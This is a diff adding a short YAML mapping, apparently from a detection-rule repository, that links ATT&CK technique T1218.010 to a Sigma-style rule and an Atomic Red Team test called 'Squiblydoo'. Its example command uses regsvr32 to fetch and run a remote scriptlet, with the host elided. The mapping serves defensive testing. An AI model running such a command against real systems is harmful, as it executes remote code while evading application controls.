@@ -1,0 +1,6 @@
+technique: 'T1218.010'
+rule: 'rules/windows/process_creation/T1218_010_regsvr32_scrobj.yml'
+atomic_test:
+    name: 'Squiblydoo'
+    auto_generated_guid_or_num: 'T1218.010-1'
+    example_command: 'regsvr32 /i:http://.../file.sct scrobj.dll'
